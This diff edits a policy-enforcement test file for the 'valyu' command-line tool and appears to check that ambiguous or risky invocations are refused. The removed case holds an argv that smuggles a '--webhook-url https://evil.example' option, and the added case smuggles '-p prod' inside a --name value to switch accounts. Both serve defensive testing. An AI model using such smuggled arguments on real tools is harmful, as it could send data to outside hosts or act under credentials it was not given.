@@ -69,11 +69,20 @@ argv = ["valyu", "deepresearch", "create", "EU AI Act timeline", "-m", "max"]
 exit = 126
 stderr = "[policy: no_high_cost]"
 
-# A dropped `--` would let valyu read --webhook-url as an option, so the line is refused
+# valyu reads `-p prod` inside the --name value as the profile, so a rule on other_account refuses it
 [[case]]
-argv = ["valyu", "contents", "--", "--webhook-url", "https://evil.example", "https://a.com"]
+argv = ["valyu", "batch", "create", "--name", "-p", "prod", "q1"]
 exit = 126
-stderr = "[policy: no_ambiguous_words]"
+stderr = "[policy: no_other_account]"
+policy = '''
+@id("valyu_actions")
+permit (principal, action in Tool::valyu::Action::"*", resource);
+
+@id("no_other_account")
+@description("Use the default Valyu credentials only.")
+forbid (principal, action in Tool::valyu::Action::"*", resource)
+when { context.input.effects.contains(Tool::valyu::Effect::"other_account") };
+'''
 
 # An undeclared command is `unmodeled`, and nothing permits it
 [[case]]
